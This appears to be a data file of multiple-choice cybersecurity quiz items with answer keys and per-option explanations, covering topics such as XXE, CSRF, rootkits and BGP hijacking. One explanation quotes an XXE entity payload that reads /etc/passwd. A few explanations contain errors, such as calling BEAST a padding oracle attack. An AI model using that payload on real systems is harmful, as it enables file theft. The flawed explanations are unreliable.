  {id:569,domain:T,question:"What is a ZIP bomb (decompression bomb)?",options:["A fictional physical explosive device concealed inside a USB drive or storage device enclosure, designed to detonate when plugged into a computer's USB port","A malicious archive that appears small but expands to enormous size when decompressed, designed to crash or overwhelm antivirus scanners and file systems","A legitimately compressed file archive containing bomb threat documents or media files that law enforcement encounters when investigating digital evidence from suspects","A denial-of-service attack specifically targeting ZIP file servers by flooding them with malformed archive requests to exhaust server processing and memory resources"],answer:1,explanation:"42.zip is a famous example — it's 42KB compressed but expands to 4.5 petabytes, causing antivirus engines that try to scan the contents to exhaust memory and crash.",optionExplanations:["ZIP bombs are software-based attacks, not physical explosive devices; a decompression bomb is a malicious file that overwhelms software processing, not physical infrastructure.","A ZIP bomb exploits the recursive compression of small files that expand dramatically — antivirus software that tries to decompress and scan content is overwhelmed, creating a DoS condition.","Archives encountered in criminal investigations are digital evidence; decompression bombs are offensive security tools designed to crash or overwhelm software that attempts to process them.","ZIP server DoS attacks target file servers with network floods; decompression bombs target any software that automatically decompresses archives, causing resource exhaustion during extraction."]},
  {id:570,domain:G,question:"What is PKCS (Public Key Cryptography Standards)?",options:["A government-mandated standard published by NIST specifying approved public key cryptography algorithms, key sizes, and implementation requirements for federal agency use","A set of standards developed by RSA Security defining formats and protocols for public key cryptography, including key formats, certificate requests, and cryptographic message syntax","A proprietary encryption file format developed and maintained exclusively by RSA Security for encrypting data in their commercial enterprise security products","A network protocol standard defining mechanisms for distributing public keys through centralized key servers, enabling participants to publish and retrieve cryptographic public keys"],answer:1,explanation:"PKCS standards (PKCS#1 RSA, PKCS#7/CMS, PKCS#8 private key, PKCS#10 CSR, PKCS#11 HSM interface, PKCS#12 certificate bundle) are foundational to PKI interoperability.",optionExplanations:["PKCS was developed by RSA Security (now commercial); it's an industry standard, not a government mandate, though many government standards reference PKCS formats.","PKCS standards define the formats used in PKI — certificate signing requests (PKCS#10), certificate bundles (.pfx/.p12 using PKCS#12), HSM token interfaces (PKCS#11), and cryptographic message syntax.","PKCS is not proprietary to RSA's commercial products; it became the foundation for widely implemented open standards including TLS, X.509, PKCS#11 token interfaces, and certificate management.","Public key distribution protocols are key server specifications; PKCS covers many cryptographic format specifications including certificate requests, key file formats, and cryptographic message syntax."]},
  {id:571,domain:T,question:"What is a cross-site request forgery (CSRF) token?",options:["A browser-side token that blocks third-party cookies from being set by advertisements and trackers on cross-site resources, used to enforce browser privacy settings","A unique, secret, unpredictable value included in web forms that the server validates to ensure requests originate from legitimate users and not from malicious third-party sites","A bearer token used in the Authorization header of cross-origin API requests, allowing third-party applications to access protected APIs on behalf of authenticated users","A session-specific encryption token that the browser uses to encrypt sensitive form field data before transmission, ensuring form contents cannot be intercepted in plaintext"],answer:1,explanation:"CSRF tokens are embedded in forms and verified server-side — a malicious site cannot read the victim's token (same-origin policy) so it cannot forge valid requests.",optionExplanations:["Cookie-blocking tokens are browser privacy mechanisms; CSRF tokens are per-session secret values embedded in forms that servers validate to confirm requests are genuinely from their own pages.","A CSRF token is a hidden form field containing a random secret that the server ties to the user's session — attackers from other origins can't read it, so they can't include a valid token in forged requests.","API authentication tokens (OAuth bearer tokens) authorize cross-origin API access; CSRF tokens specifically prevent forged form submissions from malicious third-party websites in browser contexts.","Form data encryption is provided by HTTPS transport security; CSRF tokens are unencrypted random values that verify the request originated from the legitimate site, not from a forged cross-site request."]},
  {id:572,domain:A,question:"What is security information lifecycle management?",options:["Managing the full employment lifecycle of security personnel including hiring, onboarding, training, performance management, role transitions, and offboarding procedures","The processes governing how security-relevant information (logs, incidents, intelligence) is created, collected, analyzed, stored, and ultimately disposed of","Managing the complete lifecycle of encryption keys from generation and distribution through rotation, revocation, and secure destruction to maintain cryptographic security","A structured framework for planning and executing regular replacement cycles for security tools, appliances, and technology platforms as they reach end-of-life"],answer:1,explanation:"Information lifecycle management ensures logs are retained long enough for investigations, security data is protected from tampering, and information is disposed of securely when no longer needed.",optionExplanations:["Security personnel lifecycle is human resources management; security information lifecycle management addresses how security-relevant data like logs and incident records flows through its existence.","Managing security information through its lifecycle includes log collection policies, secure storage with integrity protection, retention periods meeting compliance requirements, and secure deletion.","Key lifecycle management is a cryptographic management process; security information lifecycle covers all security-relevant data including logs, incidents, and threat intelligence.","Technology refresh planning addresses hardware and software replacement schedules; security information lifecycle management addresses the data created and used by security tools, not the tools themselves."]},
  {id:573,domain:O,question:"What is the MITRE ATT&CK framework?",options:["A structured framework developed to assess and improve the security posture of MITRE Corporation's own internal network by mapping attack surfaces and defense gaps","A knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations, used for threat modeling, detection development, and red team planning","A standardized scoring system used by penetration testers to rate discovered vulnerabilities by exploitability, impact, and severity to prioritize remediation recommendations","A governance framework for tracking, renewing, and managing cybersecurity professional certifications across a security team to ensure compliance with training requirements"],answer:1,explanation:"ATT&CK (Adversarial Tactics, Techniques & Common Knowledge) provides a common language for describing attacks — detection engineers write rules against specific technique IDs, red teams plan engagements against ATT&CK tactics.",optionExplanations:["ATT&CK was created by MITRE for the broader security community to document real-world attacker behaviors; it is not a framework targeting MITRE's own systems.","ATT&CK documents real attacker behaviors organized by tactics (why) and techniques (how) — security teams use it to assess coverage, plan detections, and communicate about threats precisely.","CVSS is the vulnerability severity scoring system; ATT&CK is a behavioral TTP knowledge base cataloging how real-world adversaries accomplish their objectives.","Certification management is a training and HR function; ATT&CK is a threat intelligence framework cataloging adversary tactics and techniques observed in real-world attacks."]},
  {id:574,domain:T,question:"What is session hijacking?",options:["Remotely taking control of a user's entire computer desktop session using remote access tools after obtaining credentials through phishing or credential theft","Stealing or forging a user's authenticated session token to impersonate them on a web application without knowing their credentials","Gaining unauthorized access to a video conferencing call by obtaining or guessing the meeting ID and passcode to eavesdrop on or disrupt the meeting","Intercepting and redirecting an authenticated user's web session to an attacker-controlled server using DNS manipulation or BGP hijacking to steal session credentials"],answer:1,explanation:"Session tokens stolen via XSS, network interception, or prediction are used to impersonate authenticated users — prevented by secure, HttpOnly, SameSite cookies and short session timeouts.",optionExplanations:["Remote desktop takeover using stolen credentials is a different attack; session hijacking specifically steals web authentication tokens to impersonate users without knowing their actual credentials.","Session hijacking captures the session cookie or token (via XSS, network sniffing, or token prediction) and uses it to make requests that appear to come from the legitimate authenticated user.","Video conference intrusion (Zoom-bombing) targets real-time communication tools; session hijacking targets web application authentication tokens to impersonate users without their credentials.","Session redirection through DNS or BGP manipulation is a network-level attack; session hijacking directly steals and replays the session token on the original application to impersonate the user."]},
  {id:575,domain:G,question:"What is the purpose of a Master Boot Record (MBR) and the UEFI threat to it?",options:["The primary bootloader application and a network-accessible vulnerability in PXE boot services that allows remote attackers to compromise systems during the boot process","The first sector of a hard drive containing partition information and bootloader code — a target for bootkits that persist below the OS level and survive reinstallation","An access log stored in the security event database that records all failed and successful master administrator password authentication attempts for auditing and intrusion detection","The primary system configuration file loaded during startup that defines operating system settings, hardware parameters, driver configurations, and network interface settings"],answer:1,explanation:"MBR bootkits (TDL4, MBRFilter target) persist even after OS reinstallation since the MBR is written before the OS. UEFI Secure Boot was designed to address this threat.",optionExplanations:["MBR vulnerability is local disk-based, not network-based; the MBR is not a bootloader application but the disk sector containing partition data and bootstrap code.","The MBR or UEFI partition table determines how the system boots — malware controlling the MBR runs before any security software, survives OS reinstallation, and is extremely difficult to detect and remove.","Password attempt logs are authentication audit records; the Master Boot Record is a specific disk sector containing partition table entries and bootstrap code, not an authentication log.","System configuration files (registry, /etc/sysctl.conf) define OS settings; the MBR is a specific 512-byte disk sector containing partition information and bootstrap code executed during system startup."]},
  {id:576,domain:P,question:"What is the principle of transparency in data privacy?",options:["Making all organizational data publicly accessible on a government open data portal or company website to promote civic engagement and public accountability","Organizations must be clear and open with individuals about how they collect, use, and share personal data in ways that are intelligible and accessible","Using publicly documented and peer-reviewed cryptographic algorithms rather than proprietary secret algorithms, following Kerckhoffs' principle that security should not depend on algorithm secrecy","Publicly disclosing security incidents and breach details to the general public as part of organizational accountability, even when not legally required to do so"],answer:1,explanation:"Transparency requires plain-language privacy notices, not legal jargon — individuals must genuinely understand what happens to their data to make meaningful choices.",optionExplanations:["Making all data publicly visible would violate confidentiality requirements and data protection principles; transparency means being open about data practices, not exposing the underlying personal data itself.","Transparency means proactively informing individuals about data practices — what's collected, why, how long, who can see it — in a clear, accessible way that enables informed decisions.","Cryptographic algorithm transparency (Kerckhoffs' principle) is a cryptographic design principle; data privacy transparency is about informing individuals how their personal data is collected, used, and shared.","Public security incident disclosure may be required in some breach notification contexts; transparency as a privacy principle broadly covers all communications about personal data practices."]},
  {id:577,domain:A,question:"What is a threat model?",options:["A behavioral profile or persona document describing a physical threat actor's motivations, capabilities, and likely tactics for conducting attacks against physical facilities","A structured analysis of an application or system that identifies potential threats, attack vectors, and necessary mitigations from an adversary's perspective","A financial analysis model that calculates expected security budgets, return on security investment, and cost-benefit ratios for proposed security control implementations","A high-level strategic description of the current network threat landscape, summarizing the categories of active threats and general trends affecting an industry sector"],answer:1,explanation:"Threat modeling (STRIDE, PASTA, DREAD) asks 'what could go wrong?' for a specific system during design — finding architectural flaws when they're cheap to fix.",optionExplanations:["Physical threat actor profiles are physical security threat intelligence; a threat model is a structured technical analysis of an application identifying security weaknesses from an adversary's view.","Threat modeling systematically identifies threats using frameworks like STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) to find security flaws during design.","Budget planning models are financial management tools; threat models are technical security analyses that identify threats and attack vectors against specific systems using frameworks like STRIDE.","Threat landscape descriptions are strategic threat intelligence summaries; a threat model is a specific technical analysis of a defined system or application's security weaknesses."]},
  {id:578,domain:O,question:"What is a bug bounty program?",options:["An internal compensation program that provides financial bonuses or incentives to software developers who identify and fix the most bugs during development sprints","A formal program offering financial rewards to security researchers who responsibly disclose vulnerabilities in the organization's systems","A quality assurance incentive program offering rewards to QA testers who discover the most software defects during internal acceptance testing and release cycles","A government-sponsored financial incentive program offering rewards to citizens who report malware infections or cyberattack evidence to law enforcement agencies"],answer:1,explanation:"Bug bounties (HackerOne, Bugcrowd, company programs) cost less than undiscovered breaches — researchers are incentivized to report rather than exploit or sell vulnerabilities.",optionExplanations:["Internal developer bug-fixing incentives are employee performance programs; bug bounties specifically incentivize external security researchers to find and responsibly disclose security vulnerabilities.","Bug bounty programs define scope, reward tiers, and responsible disclosure requirements — paying researchers based on vulnerability severity to find issues before malicious actors do.","QA testing incentives are internal software quality programs; bug bounties engage the external security research community to find security-specific vulnerabilities before malicious actors discover them.","Government malware reporting programs may involve rewards; bug bounties are specifically private or public programs rewarding security researchers for responsibly disclosing vulnerabilities in specific systems."]},
  {id:579,domain:T,question:"What is a rootkit's persistence mechanism?",options:["Creating hidden administrative user accounts or backdoor credentials that provide continued access even after the primary compromise vector has been discovered and remediated","Hooking OS functions, modifying bootloaders, or hiding in firmware to survive OS reboots and reinstallation, maintaining persistent access","Distributing encrypted copies of itself across multiple directories and registry locations to ensure at least one copy survives partial cleanup attempts by security tools","Registering itself as a scheduled task or system service that automatically restarts the malware process whenever it is terminated or the system is rebooted"],answer:1,explanation:"Firmware rootkits (like LoJax in UEFI firmware) survive complete drive wiping and OS reinstallation because they reside in flash storage outside the operating system.",optionExplanations:["Creating backdoor accounts is a post-exploitation persistence technique for maintaining access; rootkit persistence specifically subverts the operating system itself through kernel hooks and bootloader modification.","Rootkits achieve persistence through kernel hooks, UEFI/BIOS modification, or MBR infection — ensuring they load before and survive OS-level security and reinstallation.","Multi-location file copying is a basic malware resilience technique; rootkit persistence uniquely achieves survival by modifying the OS kernel, bootloader, or firmware below the level security tools operate.","Scheduled task persistence is visible to OS security tools and easily removed; rootkits hide their persistence mechanism by subverting OS-level functions to be invisible to security tools."]},
  {id:580,domain:G,question:"What is the difference between a false positive and a false negative in security?",options:["False positives are more dangerous than false negatives","A false positive is a benign event incorrectly flagged as malicious; a false negative is a malicious event incorrectly classified as benign","They are the same type of detection error","False negatives are always rare in modern security tools"],answer:1,explanation:"Both errors have costs: false positives waste analyst time and cause alert fatigue; false negatives miss real attacks. The balance depends on sensitivity/specificity tuning.",optionExplanations:["Neither is universally more dangerous; false positives cause alert fatigue and false negatives miss real threats — both have serious consequences.","A false positive triggers unnecessary investigation (clean email blocked, legitimate file quarantined); a false negative misses a real attack (malware not detected, intrusion not alerted).","They are opposite error types — false positives flag benign events as threats; false negatives miss actual threats.","False negative rates depend heavily on tuning and novel attacks; modern tools have both types of errors, and false negatives for sophisticated attacks can be quite high."]},
  {id:581,domain:T,question:"What is a DDoS attack's distinction from a DoS attack?",options:["DDoS uses more sophisticated techniques","A DDoS (Distributed Denial of Service) attack uses many geographically distributed systems (often a botnet) to flood the target, making it much harder to block than single-source DoS","DoS attacks are always more powerful","DDoS attacks target distributed systems while DoS attacks target centralized systems"],answer:1,explanation:"DDoS attacks use thousands to millions of compromised systems — blocking one IP stops nothing; defending requires upstream scrubbing, anycast, or anti-DDoS services.",optionExplanations:["Both DoS and DDoS can use sophisticated techniques; the key distinction is the number and distribution of attack sources.","DDoS uses many attacking systems simultaneously — making source IP blocking ineffective — and generates traffic volumes that overwhelm target infrastructure.","DDoS attacks are generally more powerful due to distributed traffic volumes; DoS from a single source is easier to mitigate.","DDoS refers to the distributed source of the attack, not the nature of the target; both can target any type of system."]},
  {id:582,domain:A,question:"What is a protocol analyzer (packet sniffer)?",options:["A tool that analyzes security protocols for vulnerabilities","Software or hardware that captures and analyzes network packets flowing through a network interface, providing visibility into network communications","A tool for optimizing network protocols","A device that blocks suspicious protocols"],answer:1,explanation:"Wireshark, tcpdump, and Zeek capture packets for troubleshooting, protocol analysis, incident investigation, and security monitoring — but attackers also use them to intercept credentials.",optionExplanations:["Protocol vulnerability analysis is a different security assessment; packet sniffers capture live network traffic.","Protocol analyzers capture raw network packets and decode their protocol fields — enabling analysis of exactly what data is flowing on the network, for both legitimate and malicious purposes.","Protocol optimization is network engineering; sniffers capture and analyze traffic without modifying it.","Traffic blocking is done by firewalls and IPS; packet sniffers capture and analyze traffic passively."]},
  {id:583,domain:O,question:"What is vulnerability disclosure and coordinated disclosure?",options:["Disclosing all vulnerabilities publicly immediately","The process of reporting discovered vulnerabilities to affected vendors and allowing them time to develop and release patches before public disclosure of the vulnerability details","Disclosing vulnerabilities only to government agencies","Sharing vulnerability details with security community without vendor notification"],answer:1,explanation:"Coordinated disclosure (responsible disclosure) gives vendors typically 90 days (Google Project Zero standard) to patch before researchers publish — balancing public safety with research openness.",optionExplanations:["Immediate full disclosure is 'full disclosure'; coordinated disclosure provides vendors time to patch first.","Coordinated disclosure notifies the vendor first, establishes a patch timeline, and publishes details only after the patch is available — enabling users to protect themselves while giving vendors fair opportunity to fix.","Government-only disclosure is sometimes used for critical infrastructure vulnerabilities; standard coordinated disclosure goes to the affected vendor.","Sharing details without vendor notification is full disclosure; coordinated disclosure always involves vendor notification first."]},
  {id:584,domain:T,question:"What is an XML external entity (XXE) injection?",options:["Injecting XML into database queries","A web security vulnerability where attackers exploit XML parsers by injecting external entity references that read local files, perform SSRF, or cause denial of service","Injecting malicious entities into XML databases","An attack on XML-based authentication systems"],answer:1,explanation:"XXE exploits XML parsers that process external entity declarations — attackers can read /etc/passwd, internal network files, or make the server send requests to internal services.",optionExplanations:["Database XML injection is a different attack; XXE specifically exploits XML parser external entity processing.","XXE attacks inject external entity declarations (<!ENTITY ext SYSTEM 'file:///etc/passwd'>) that cause vulnerable XML parsers to process them, exposing sensitive files or enabling server-side request forgery.","XML database attacks are different; XXE specifically targets XML parsing functionality in web applications.","XML authentication attacks may use XXE as a technique; XXE itself is specifically about external entity processing in XML parsers."]},
  {id:585,domain:G,question:"What is the role of an Online Certificate Status Protocol (OCSP) responder?",options:["A server that issues digital certificates","A service that provides real-time certificate revocation status for a specific certificate, as an alternative to downloading the entire CRL","A protocol for online certificate renewal","A service that checks certificate expiration dates"],answer:1,explanation:"OCSP provides faster, smaller revocation checks than CRLs — OCSP stapling has the server cache and serve the OCSP response, reducing latency and improving privacy.",optionExplanations:["Certificate issuance is done by CAs; OCSP responders answer revocation status queries.","An OCSP responder receives a certificate serial number query and responds with 'good', 'revoked', or 'unknown' — providing real-time revocation status without downloading the entire CRL.","Certificate renewal is handled by the CA registration process; OCSP is specifically for revocation status checking.","OCSP checks revocation status, not expiration; certificate expiration is checked by comparing the certificate's validity period."]},
  {id:586,domain:P,question:"What is data tokenization?",options:["Creating authentication tokens for users","Replacing sensitive data with non-sensitive placeholder values (tokens) while maintaining a mapping in a secure vault, allowing systems to process tokens without accessing actual data","Converting data into token format for blockchain","Tokenizing user access rights"],answer:1,explanation:"Payment tokenization (credit card PANs replaced with tokens) means merchants never store actual card numbers — a breach of the merchant system exposes only worthless tokens.",optionExplanations:["Authentication tokens are identity management tools; data tokenization replaces sensitive data values with placeholder tokens.","Tokenization replaces sensitive values (credit card numbers, SSNs) with random tokens stored in a secure vault — the original data never leaves the vault, reducing the sensitive data footprint.","Blockchain tokenization converts assets to digital tokens; data security tokenization protects sensitive data in payment and data processing systems.","Access right tokens are authorization tokens; data tokenization is a data protection technique for sensitive values like payment card data."]},
  {id:587,domain:A,question:"What is an endpoint detection and response (EDR) platform?",options:["A platform for managing network endpoints","A security solution that continuously monitors endpoints for suspicious behavior, records detailed activity, and enables investigation and response to detected threats","An antivirus solution for endpoint devices","A platform for deploying security patches to endpoints"],answer:1,explanation:"EDR (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint) records every process, file change, network connection, and registry modification — enabling threat hunting and incident response.",optionExplanations:["Endpoint management is MDM/UEM; EDR is specifically a security detection and response tool.","EDR continuously records endpoint telemetry, applies behavioral detection to identify threats, enables remote investigation and containment, and supports threat hunting — far beyond traditional antivirus.","Antivirus uses signatures and some heuristics; EDR provides comprehensive behavioral monitoring, recording, and response capabilities.","Patch deployment is patch management; EDR focuses on threat detection, investigation, and response on endpoints."]},
  {id:588,domain:O,question:"What is the role of a CISO (Chief Information Security Officer)?",options:["Managing the company's information storage","The senior executive responsible for establishing and maintaining the enterprise information security program, managing risk, and aligning security with business objectives","The head of the IT department","A compliance manager for security standards"],answer:1,explanation:"The CISO translates technical security risk into business terms for the board, owns the security strategy, manages the security team, and is accountable for the security posture.",optionExplanations:["Information storage is managed by data center and storage teams; the CISO is a strategic leadership role.","The CISO is a C-suite security executive — building security strategy, managing the security budget and team, presenting risk to the board, ensuring compliance, and making risk-based security decisions.","The IT department is typically led by a CIO or CTO; the CISO focuses specifically on security risk management.","Compliance management is one CISO responsibility; the role encompasses the entire organizational security program."]},
  {id:589,domain:T,question:"What is a malvertising attack?",options:["Advertising malware products","Injecting malicious code into legitimate advertising networks to deliver malware through ads displayed on legitimate, high-traffic websites","Creating malicious advertisements to deceive users","Advertising malware removal services fraudulently"],answer:1,explanation:"Malvertising compromises advertising networks to serve malicious ads on legitimate sites (New York Times, BBC have been affected) — users don't need to click; drive-by downloads trigger automatically.",optionExplanations:["Advertising malware products is different; malvertising uses advertising as a distribution mechanism for malware.","Malvertising buys or compromises ad inventory to serve ads containing exploit code — the ads appear on legitimate sites, reaching millions of users who trust the hosting site.","Deceptive ads are phishing-related; malvertising specifically delivers malware through compromised advertising networks on legitimate sites.","Fraudulent malware removal ads are scareware; malvertising injects actual malware delivery mechanisms into legitimate advertising networks."]},
  {id:590,domain:G,question:"What is Perfect Forward Secrecy (PFS) achieved through?",options:["Using the same session key repeatedly","Using ephemeral (temporary) key exchange (ECDHE or DHE) that generates a unique session key for each connection, ensuring past sessions remain secure if long-term keys are compromised","Distributing perfect keys across multiple servers","Using perfect hash functions for key generation"],answer:1,explanation:"ECDHE generates a new key pair for every TLS session — even if an attacker captures all TLS traffic and later steals the server private key, past sessions cannot be decrypted.",optionExplanations:["Reusing session keys eliminates forward secrecy; PFS requires a new key for each session.","PFS uses Diffie-Hellman with ephemeral keys (DHE) or its elliptic curve variant (ECDHE) — each connection generates a fresh key exchange, so recorded past sessions are protected from future key compromise.","Distributed keys don't achieve PFS; forward secrecy requires that session keys are never stored and are generated fresh for each session.","Hash functions generate digests; PFS is achieved through ephemeral asymmetric key exchange in each session."]},
  {id:591,domain:T,question:"What is a padding oracle attack?",options:["An attack that exploits oracle database padding","An attack exploiting error messages from decryption processes to decrypt ciphertext without the key, by determining if padding is valid or invalid","A brute force attack using oracle computing","An attack on blockchain smart contracts using padding"],answer:1,explanation:"POODLE and BEAST exploited padding oracle vulnerabilities in SSL/TLS — the oracle's different error responses for bad padding vs. bad MAC leaked decryption information.",optionExplanations:["Oracle database padding is unrelated; this is a cryptographic attack against cipher modes.","A padding oracle attack sends modified ciphertexts and observes whether the decryption produces valid padding — different responses to padding errors vs. MAC errors reveal bits of the plaintext.","Brute force doesn't exploit oracle-specific conditions; padding oracles exploit specific error message differences.","Smart contract attacks are blockchain security; padding oracles target symmetric encryption implementations."]},
  {id:592,domain:A,question:"What is serverless computing security?",options:["Security for servers that don't need power","Security considerations for functions-as-a-service (FaaS) where traditional server security doesn't apply — focusing on function permissions, injection attacks, and supply chain risks in dependencies","Security for virtualized servers","A security model with no servers"],answer:1,explanation:"Serverless (AWS Lambda, Azure Functions) shifts infrastructure security to the provider but creates new risks: overprivileged IAM roles, function event injection, and insecure dependencies.",optionExplanations:["Powerless servers don't exist in this context; serverless is a cloud computing model.","Serverless security addresses unique challenges: functions run with IAM roles (must follow least privilege), receive events from various sources (injection risks), and have dependencies (SCA needed).","Virtualized server security is VM security; serverless is FaaS where developers manage code, not servers.","'No servers' is the developer's perspective; servers exist but are managed by the cloud provider — security focuses on function behavior and permissions."]},
  {id:593,domain:O,question:"What is a security dashboard?",options:["A dashboard on security vehicles","A visual interface providing real-time metrics and status information about an organization's security posture, active threats, and key performance indicators","A dashboard for managing security staff schedules","A control panel for security cameras"],answer:1,explanation:"Security dashboards (in SIEM, SOC platforms) aggregate metrics like open incidents, vulnerability counts, patch compliance, and detection rate — enabling rapid situational awareness.",optionExplanations:["Security vehicle dashboards are physical; security dashboards are digital monitoring displays.","A security dashboard consolidates metrics from multiple security tools into a single view — showing alert trends, incident status, compliance metrics, and key risk indicators for situational awareness.","Staff scheduling is workforce management; security dashboards focus on technical security posture metrics.","Camera control panels are physical security systems; security dashboards aggregate cybersecurity operational metrics."]},
  {id:594,domain:P,question:"What is privacy-preserving analytics?",options:["Conducting analytics privately in secret","Techniques that enable analysis of data to extract insights without exposing individual personal data — including differential privacy, homomorphic encryption, and federated learning","Analytics on private company data","Removing personal data after analytics are complete"],answer:1,explanation:"Differential privacy (used by Apple, Google for telemetry) adds calibrated noise to aggregate results, preventing individual re-identification while preserving statistical accuracy.",optionExplanations:["Secret analytics is just non-disclosed analysis; privacy-preserving analytics uses mathematical techniques to protect individual data.","Privacy-preserving techniques (differential privacy, secure multi-party computation, federated learning) enable useful data analysis while providing mathematical guarantees that individuals cannot be identified.","Analytics on any company data doesn't address privacy preservation; privacy-preserving analytics specifically protects personal data within analytical processes.","Removing data after analysis doesn't help if analysis itself exposed personal data; privacy-preserving techniques protect during analysis."]},
  {id:595,domain:G,question:"What is a trojan access tool (RAT — Remote Access Trojan)?",options:["A tool for accessing remote servers legitimately","Malware that provides attackers with full remote control over a compromised system including file access, command execution, screen viewing, keylogging, and webcam activation","A legitimate remote desktop protocol tool","A tool for accessing trojans remotely for analysis"],answer:1,explanation:"RATs (DarkComet, njRAT, Poison Ivy) provide attackers complete access — they can see the screen, record keystrokes, access files, and use the system as a platform for further attacks.",optionExplanations:["Legitimate remote server access is SSH, RDP; RATs are malicious covert remote access tools.","A RAT installs a covert backdoor giving attackers full system control — essentially complete ownership of the victim system from a remote location, without the user's knowledge.","Remote desktop tools (RDP, VNC) are legitimate tools; RATs are malicious software with the same technical capability but installed without consent.","Analyzing trojans remotely is a malware analysis activity; RATs are the malware itself providing remote access to attackers."]},
  {id:596,domain:T,question:"What is BGP (Border Gateway Protocol) security risk?",options:["BGP creates security vulnerabilities in routers","BGP lacks built-in authentication, making it susceptible to route hijacking where attackers advertise more specific routes to redirect internet traffic","BGP is a deprecated insecure protocol","BGP security risks are only theoretical"],answer:1,explanation:"BGP route hijacking (like the 2008 Pakistan Telecom incident that took down YouTube globally) exploits BGP's trust model — RPKI (Resource Public Key Infrastructure) is the primary mitigation.",optionExplanations:["BGP is a routing protocol creating routing vulnerabilities, not arbitrary router vulnerabilities.","BGP was designed in an era of trust between ISPs — it has no cryptographic authentication of route announcements, allowing any AS to announce routes for IP prefixes they don't own.","BGP is still the internet's primary inter-domain routing protocol; its security risks are very real and actively exploited.","BGP route hijacking has been demonstrated repeatedly with real-world internet traffic impacts; the risks are practical and ongoing."]},
  {id:597,domain:A,question:"What is a security boundary?",options:["A physical boundary around a data center","A defined point where security policies, controls, and trust levels change — such as the boundary between a trusted internal network and an untrusted external network","A boundary for security team responsibilities","A regulatory boundary defining security requirements"],answer:1,explanation:"Security boundaries determine where controls must be applied — firewalls at network boundaries, data classification at data access boundaries, encryption at transmission boundaries.",optionExplanations:["Physical perimeters are physical security boundaries; security boundaries can be logical or physical.","Security boundaries are defined points where the security context changes — between security zones, trust levels, or administrative domains — requiring security controls at those transition points.","Responsibility boundaries are organizational; security boundaries are architectural points requiring controls.","Regulatory boundaries define compliance scope; security boundaries are the architectural points where different security requirements apply."]},
  {id:598,domain:O,question:"What is a security control framework?",options:["A physical framework for security equipment","A structured collection of security controls organized into categories that organizations can implement to achieve security objectives and comply with regulations","A framework for managing security software","A government regulatory framework for security"],answer:1,explanation:"CIS Controls, NIST 800-53, ISO 27001 Annex A provide control catalogs — organizations select and implement controls based on risk and compliance requirements.",optionExplanations:["Physical equipment frameworks are rack systems; security control frameworks are collections of security requirements.","Control frameworks (CIS Controls, NIST SP 800-53) provide libraries of technical, operational, and management controls that organizations select from to build security programs.","Security software management is a subset; control frameworks address the entire range of organizational security activities.","Government frameworks (NIST, FedRAMP) are regulatory; many control frameworks are voluntary industry standards applicable regardless of regulation."]},
  {id:599,domain:T,question:"What is a race condition vulnerability?",options:["A vulnerability in racing game software","A software vulnerability where the outcome of events depends on the sequence or timing of operations, allowing attackers to manipulate timing to gain unauthorized access or corrupt data","A performance vulnerability causing system slowdown","A vulnerability triggered by multiple simultaneous requests"],answer:1,explanation:"TOCTOU (Time of Check to Time of Use) race conditions occur when security checks and resource use have a window an attacker can exploit — changing a file between the check and the use.",optionExplanations:["Racing game software vulnerabilities are domain-specific; race conditions are a class of concurrency security bugs.","Race conditions occur when multiple processes or threads access shared resources without proper synchronization — an attacker can win the race by manipulating timing between check and use.","Performance issues are optimization problems; race conditions are security vulnerabilities that can lead to privilege escalation or data corruption.","Multiple simultaneous requests can trigger race conditions but the vulnerability is specifically about timing-dependent security checks and resource access."]},
  {id:600,domain:G,question:"What is security through obscurity?",options:["A valid security strategy relying on secrecy of implementation","Relying on the secrecy of system design or implementation details as the primary security mechanism — widely considered insufficient since determined attackers can discover hidden details","Encrypting security tool configurations","Using obscure security protocols"],answer:1,explanation:"Kerckhoffs' principle states security should depend only on key secrecy, not algorithm obscurity — attackers can reverse-engineer systems, but they can't steal a well-protected key.",optionExplanations:["Security through obscurity is generally considered insufficient; it can supplement but not replace real security controls.","Relying on attackers not knowing how your system works is fragile — source code leaks, reverse engineering, and insider knowledge all defeat obscurity. Real security works even when the design is known.","Encrypting configurations is a legitimate security practice; security through obscurity refers to the overall design philosophy of hiding implementation details as the primary defense.","Using non-standard protocols is one form of security through obscurity; the concept broadly means depending on implementation secrecy rather than proven cryptographic mechanisms."]},
  {id:601,domain:T,question:"What is a watering hole malware delivery chain?",options:["Delivering malware through water system networks","Attackers compromise a legitimate website, inject exploit code, users visit the site and are automatically infected — without any email or social engineering required","Infecting water treatment systems with malware","Delivering malware through streaming services"],answer:1,explanation:"APT groups use watering holes for targeted attacks — compromising industry-specific sites (security conference sites, defense contractor portals) to reach specific targets.",optionExplanations:["Water system network attacks are OT/ICS attacks; watering holes are web-based delivery mechanisms.","The watering hole chain: attacker finds sites the target frequents → compromises those sites → inserts exploit code → victim visits, gets auto-infected. No user action beyond visiting the known site required.","Water treatment systems are OT targets; watering hole attacks target websites that specific victim groups visit.","Streaming services can theoretically be used as watering holes, but the technique refers to compromising any frequently visited websites to infect target users."]},
  {id:602,domain:A,question:"What is a hardware-based VPN vs. software-based VPN?",options:["Hardware VPNs are more expensive; software VPNs are cheaper","Hardware VPNs use dedicated appliances for higher throughput and reliability; software VPNs run on general-purpose hardware and are more flexible and lower cost","Hardware VPNs are more secure; software VPNs are less secure","They use different protocols and cannot interoperate"],answer:1,explanation:"Hardware VPNs (Cisco ASA, Palo Alto) handle high-throughput enterprise connections; software VPNs (OpenVPN, WireGuard) offer flexibility and lower cost for smaller deployments.",optionExplanations:["Cost differences are real but not the primary technical distinction; performance and flexibility are the key tradeoffs.","Hardware VPN appliances have dedicated encryption processors enabling high throughput at low latency; software VPNs run on CPUs and share processing resources with other workloads.","Both hardware and software VPNs can use equivalent cryptography; security depends on configuration and protocol, not hardware vs. software.","Hardware and software VPNs generally use standard protocols (IPsec, SSL/TLS) enabling interoperability across implementations."]},
